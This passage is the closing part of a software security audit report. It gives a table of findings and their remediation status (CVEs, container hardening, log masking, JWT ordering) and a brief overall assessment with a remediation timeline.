| CORS Policy                | ✅ Good (allow-list enforced in prod)    | ✅ + Vary header                    |
| Dependency Security        | ⚠️ 2 High CVEs                           | ✅ After npm audit fix              |
| Container Security         | ⚠️ Root user, Redis exposed              | ✅ After Docker hardening           |
| PII / Log Hygiene          | ⚠️ Recipient logged in errors            | ✅ After masking                    |
| Business Logic             | ⚠️ JWT generated before verification     | ✅ After reorder                    |

The codebase demonstrates deliberate security thinking in its core cryptographic operations. The most urgent issues are operational (live secrets, unauthenticated OIDC endpoints) rather than fundamental design flaws. The Phase 1 remediation is achievable in a single working day; the full roadmap is achievable within one month.
